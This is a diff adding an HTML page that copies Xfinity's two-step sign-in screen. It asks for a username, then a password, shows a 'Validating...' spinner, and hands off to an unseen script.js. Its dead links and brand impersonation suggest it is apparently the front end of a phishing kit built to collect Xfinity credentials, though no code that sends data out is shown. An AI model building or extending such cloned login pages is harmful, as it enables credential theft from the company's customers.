@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in with your Xfinity ID</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- STEP 1 -->
+  <div class="container" id="step1">
+    <h1>Sign in with your Xfinity ID</h1>
+
+    <input
+      type="text"
+      id="username"
+      placeholder="Email, mobile, or username"
+    />
+
+    <p class="terms">
+      By signing in, you agree to our
+      <a href="#">Terms of Service</a> and
+      <a href="#">Privacy Policy</a>.
+    </p>
+
+    <button id="nextBtn">Let’s go</button>
+
+    <div class="links">
+      <div class="link-item">New to Xfinity? View exclusive offers near you →</div>
+      <div class="link-item">Find your Xfinity ID →</div>
+      <div class="link-item">Create a new Xfinity ID →</div>
+    </div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="container hidden" id="step2">
+
+    <div class="logo">xfinity</div>
+
+    <p id="displayEmail" class="email"></p>
+
+    <h1>Enter your password</h1>
+
+    <div class="password-box">
+      <input type="password" id="password" placeholder="Password" />
+      <span class="eye" id="togglePassword">👁</span>
+    </div>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="checkbox">
+      <input type="checkbox" id="keepSignedIn" />
+      <label for="keepSignedIn">Keep me signed in</label>
+    </div>
+
+    <p class="terms">
+      By signing in, you agree to our
+      <a href="#">Terms of Service</a> and
+      <a href="#">Privacy Policy</a>.
+    </p>
+
+    <button id="loginBtn">Sign in</button>
+
+    <!-- Validation Loader -->
+    <div id="verifyingBox" class="verifying hidden">
+      <div class="spinner"></div>
+      <span>Validating...</span>
+    </div>
+
+    <p class="alt" id="switchAccount" style="cursor:pointer;">
+      Sign in as someone else
+    </p>
+
+    <p class="help">
+      Trouble signing in? <a href="#">Get help</a>
+    </p>
+
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
